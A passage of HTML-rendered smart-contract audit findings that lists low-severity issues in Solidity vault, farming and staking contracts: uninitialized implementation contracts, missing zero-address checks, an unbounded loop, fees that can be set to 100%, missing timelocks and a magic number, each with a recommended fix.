2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Codebase Impressions &#x26; Summary</h2>\n<p>Overall, the code quality is high.</p>\n<p>The findings here revolve around some commonly suggested practices.</p>\n<h2 id=\"l-01-add-constructor-initializers\" style=\"position:relative;\"><a href=\"#l-01-add-constructor-initializers\" aria-label=\"l 01 add constructor initializers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Add constructor initializers</h2>\n<p>As per <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6\">OpenZeppelin’s (OZ) recommendation</a>, “The guidelines are now to make it impossible for <em>anyone</em> to run <code>initialize</code> on an implementation contract, by adding an empty constructor with the <code>initializer</code> modifier. So the implementation contract gets initialized automatically upon deployment.”</p>\n<p>Note that this behaviour is also incorporated the <a href=\"https://wizard.openzeppelin.com/\">OZ Wizard</a> since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the <a href=\"https://wizard.openzeppelin.com/\">Wizard 19</a> to include a constructor that automatically initializes the implementation when deployed.”</p>\n<p>Furthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CryptoPunksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">punksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EtherRocksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEGStaking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20Upgradeable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">66</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/NFTVault.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">139</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">initialize</span><span class=\"mtk1\">(</span></span></span></code></pre>\n<h2 id=\"l-02-immutable-addresses-should-be-0-checked\" style=\"position:relative;\"><a href=\"#l-02-immutable-addresses-should-be-0-checked\" aria-label=\"l 02 immutable addresses should be 0 checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Immutable addresses should be 0-checked</h2>\n<p>Consider adding an <code>address(0)</code> check here (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">77</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">28</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">53</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit low: should be address(0)</span></span></span></code></pre>\n<h2 id=\"l-03-unbounded-loop-on-array-can-lead-to-dos\" style=\"position:relative;\"><a href=\"#l-03-unbounded-loop-on-array-can-lead-to-dos\" aria-label=\"l 03 unbounded loop on array can lead to dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Unbounded loop on array can lead to DoS</h2>\n<p>As this array can grow quite large, the transaction’s gas cost could exceed the block gas limit and make it impossible to call this function at all (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_allocPoint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_lpToken</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">( </span><span class=\"mtk3\">//@audit low: a push exist but there&#39;s no pop in the solution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAll</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) { </span><span class=\"mtk3\">//@audit low: poolInfo is unbounded</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_updatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Consider introducing a reasonable upper limit based on block gas limits and/or adding a <code>remove</code> method to remove elements in the array.</p>\n<h2 id=\"l-04-add-a-timelock-and-event-to-critical-functions\" style=\"position:relative;\"><a href=\"#l-04-add-a-timelock-and-event-to-critical-functions\" aria-label=\"l 04 add a timelock and event to critical functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Add a timelock and event to critical functions</h2>\n<p>It is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.</p>\n<p>Consider adding a timelock and event to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">vaults/yVault/strategies/StrategyPUSDConvex.sol:177:    function setPerformanceFee(Rate memory _performanceFee)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vaults/NFTVault.sol:290:    function setOrganizationFeeRate(Rate memory _organizationFeeRate)</span></span></code></pre>\n<h2 id=\"l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\" style=\"position:relative;\"><a href=\"#l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\" aria-label=\"l 05 fee in strategypusdconvexsetperformancefee should be upper bounded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Fee in <code>StrategyPUSDConvex.setPerformanceFee()</code> should be upper-bounded</h2>\n<p>See <code>@audit</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPerformanceFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">178:         </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">179:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">180:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">&quot;INVALID_RATE&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit low: fee can be 100% (_performanceFee.denominator == _performanceFee.numerator)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\" style=\"position:relative;\"><a href=\"#l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\" aria-label=\"l 06 fee in nftvaultsetorganizationfeerateshould be upper bounded permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Fee in <code>NFTVault.setOrganizationFeeRate()</code>should be upper-bounded</h2>\n<p>See <code>@audit</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">290</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOrganizationFeeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">)  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">291:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">292:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DAO_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">293:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_validateRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">295</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">organizationFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit low: fee can be 100%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">//@audit low: fee can be 100% (rate.denominator == rate.numerator)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">403</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">&quot;invalid_rate&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">404</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">405</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\" style=\"position:relative;\"><a href=\"#l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\" aria-label=\"l 07 a magical number should be documented and explained 1e36 use a constant instead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] A magical number should be documented and explained: <code>1e36</code>. Use a constant instead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">196</span><span class=\"mtk1\">:                </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">207</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">307</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">94</span><span class=\"mtk1\">:            </span><span class=\"mtk7\">1e36</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">172</span><span 